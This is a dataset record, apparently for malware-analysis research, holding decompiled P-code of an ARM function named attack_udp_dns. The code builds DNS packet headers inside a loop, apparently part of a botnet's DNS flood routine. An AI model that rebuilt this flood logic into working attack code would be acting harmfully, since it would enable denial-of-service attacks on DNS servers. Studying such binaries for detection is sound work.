Label: 856
Function: attack_udp_dns
Architecture: arm
Source File: Unknown
Entry Point: 00019540

High-level P-code:

(register, 0x2c, 4) INT_ZEXT (register, 0x20, 1)
(unique, 0x1000021d, 4) CALL (ram, 0x26a60, 8) , (register, 0x2c, 4) , (const, 0x4, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x3d, 4)
(stack, 0xffffffffffffffe4, 4) MULTIEQUAL (stack, 0xffffffffffffffe4, 4) , (stack, 0xffffffffffffffe4, 4)
(stack, 0xffffffffffffffea, 1) MULTIEQUAL (stack, 0xffffffffffffffea, 1) , (stack, 0xffffffffffffffea, 1)
(stack, 0xffffffffffffffeb, 1) MULTIEQUAL (stack, 0xffffffffffffffeb, 1) , (stack, 0xffffffffffffffeb, 1)
(stack, 0xffffffffffffffec, 4) MULTIEQUAL (stack, 0xffffffffffffffec, 4) , (stack, 0xffffffffffffffec, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (const, 0x11, 1)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x63d, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x63d, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffa8, 4) , (const, 0x9, 4)
(register, 0x28, 4) LOAD (const, 0x1a1, 4) , (ram, 0x19cb4, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x10000163, 4) , (register, 0x28, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x644, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x644, 4)
(unique, 0x8280, 4) PTRSUB (stack, 0xffffffffffffffa8, 4) , (const, 0xc, 4)
(unique, 0x10000163, 4) PTRSUB (unique, 0x10000249, 4) , (const, 0x0, 4)
(unique, 0x10000249, 4) PTRSUB (unique, 0x8280, 4) , (const, 0x0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x8280, 4) , (stack, 0xffffffffffffffc8, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x64a, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x64a, 4)
(unique, 0x10000167, 4) PTRSUB (stack, 0xffffffffffffffa8, 4) , (const, 0xc, 4)
(unique, 0x8280, 4) PTRSUB (unique, 0x1000024d, 4) , (const, 0x4, 4)
(unique, 0x1000024d, 4) PTRSUB (unique, 0x10000167, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffd8, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x650, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x650, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x650, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x650, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x650, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x650, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x650, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x650, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x650, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x650, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x650, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x650, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x650, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x1000016f, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x657, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x657, 4)
(unique, 0x1000016f, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffd6, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x65d, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x65d, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x65d, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x65d, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x65d, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x65d, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x65d, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x65d, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x65d, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x65d, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x65d, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x65d, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x65d, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x664, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x664, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0x2, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd3, 1)
(unique, 0x3b00, 4) INT_AND (stack, 0xffffffffffffffc4, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (register, 0x2c, 4) , (unique, 0x3b00, 4)
(unique, 0x3b00, 4) INT_AND (register, 0x2c, 4) , (const, 0xffff, 4)
(register, 0x2c, 4) INT_ADD (unique, 0x3b00, 4) , (const, 0x1b, 4)
(unique, 0x3580, 4) INT_MULT (register, 0x2c, 4) , (const, 0x10000, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (register, 0x20, 2)
(register, 0x20, 2) SUBPIECE (unique, 0x1000020d, 4) , (const, 0x0, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x6ce, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x6ce, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x6ce, 4)
(unique, 0x1000020d, 4) INT_RIGHT (unique, 0x3580, 4) , (const, 0x10, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x6d5, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x6d5, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa4, 4) , (const, 0x4, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (stack, 0xffffffffffffffd4, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x6db, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x6db, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x6db, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x6db, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x6db, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x1000017b, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x6e2, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x6e2, 4)
(unique, 0x1000017b, 4) PTRSUB (stack, 0xffffffffffffffa0, 4) , (const, 0x0, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x100, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x6f0, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x6f0, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x6f0, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x6f7, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x6f7, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa0, 4) , (const, 0x2, 4)
(register, 0x20, 2) CALL (ram, 0x2bbf4, 8) , (const, 0x1, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x705, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (stack, 0xffffffffffffff9c, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x705, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x705, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x705, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x705, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x705, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x705, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x705, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x705, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (stack, 0xffffffffffffffe4, 4) , (const, 0x705, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x705, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x705, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x705, 4)
 ---  STORE (const, 0x1a1, 4) , (unique, 0x9180, 4) , (register, 0x20, 2)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x70c, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x70c, 4)
(unique, 0x9180, 4) PTRSUB (stack, 0xffffffffffffffa0, 4) , (const, 0x4, 4)
 ---  STORE (const, 0x1a1, 4) , (stack, 0xffffffffffffff9c, 4) , (stack, 0xffffffffffffffd3, 1)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x722, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x722, 4)
(register, 0x2c, 4) INT_ZEXT (stack, 0xffffffffffffffd3, 1)
(register, 0x2c, 4) PTRADD (stack, 0xffffffffffffff9c, 4) , (unique, 0x10000187, 4) , (const, 0x1, 4)
(unique, 0x10000187, 4) INT_ADD (register, 0x2c, 4) , (const, 0x1, 4)
(register, 0x20, 4) PTRADD (register, 0x2c, 4) , (const, 0x1, 4) , (const, 0x1, 4)
(register, 0x2c, 4) INT_ADD (stack, 0xffffffffffffffc4, 4) , (const, 0x1, 4)
 ---  CALL (ram, 0x1e088, 8) , (register, 0x20, 4) , (stack, 0xffffffffffffffcc, 4) , (register, 0x2c, 4)
(ram, 0x19cb0, 4) INDIRECT (ram, 0x19cb0, 4) , (const, 0x754, 4)
(ram, 0x19cb4, 4) INDIRECT (ram, 0x19cb4, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffff94, 4) INDIRECT (stack, 0xffffffffffffff94, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffff98, 4) INDIRECT (stack, 0xffffffffffffff98, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffff9c, 4) INDIRECT (register, 0x2c, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffa0, 4) INDIRECT (stack, 0xffffffffffffffa0, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffa4, 4) INDIRECT (stack, 0xffffffffffffffa4, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffa8, 4) INDIRECT (stack, 0xffffffffffffffa8, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffc0, 4) INDIRECT (stack, 0xffffffffffffffc0, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffc4, 4) INDIRECT (stack, 0xffffffffffffffc4, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffc8, 4) INDIRECT (stack, 0xffffffffffffffc8, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffcc, 4) INDIRECT (stack, 0xffffffffffffffcc, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffd3, 1) INDIRECT (stack, 0xffffffffffffffd3, 1) , (const, 0x754, 4)
(stack, 0xffffffffffffffd4, 2) INDIRECT (stack, 0xffffffffffffffd4, 2) , (const, 0x754, 4)
(stack, 0xffffffffffffffd6, 2) INDIRECT (stack, 0xffffffffffffffd6, 2) , (const, 0x754, 4)
(stack, 0xffffffffffffffd8, 2) INDIRECT (stack, 0xffffffffffffffd8, 2) , (const, 0x754, 4)
(stack, 0xffffffffffffffda, 1) INDIRECT (stack, 0xffffffffffffffda, 1) , (const, 0x754, 4)
(stack, 0xffffffffffffffdb, 1) INDIRECT (stack, 0xffffffffffffffdb, 1) , (const, 0x754, 4)
(stack, 0xffffffffffffffdc, 2) INDIRECT (stack, 0xffffffffffffffdc, 2) , (const, 0x754, 4)
(stack, 0xffffffffffffffdf, 1) INDIRECT (stack, 0xffffffffffffffdf, 1) , (const, 0x754, 4)
(stack, 0xffffffffffffffe0, 4) INDIRECT (stack, 0xffffffffffffffe0, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffe4, 4) INDIRECT (unique, 0x10000219, 4) , (const, 0x754, 4)
(stack, 0xffffffffffffffea, 1) INDIRECT (stack, 0xffffffffffffffea, 1) , (const, 0x754, 4)
(stack, 0xffffffffffffffeb, 1) INDIRECT (stack, 0xffffffffffffffeb, 1) , (const, 0x754, 4)
(stack, 0xffffffffffffffec, 4) INDIRECT (stack, 0xffffffffffffffec, 4) , (const, 0x754, 4)
(unique, 0x10000219, 4) COPY (register, 0x2c, 4)
(stack, 0xffffffffffffffec, 4) COPY (const, 0x0, 4)
 ---  BRANCH (ram, 0x199e4, 1)
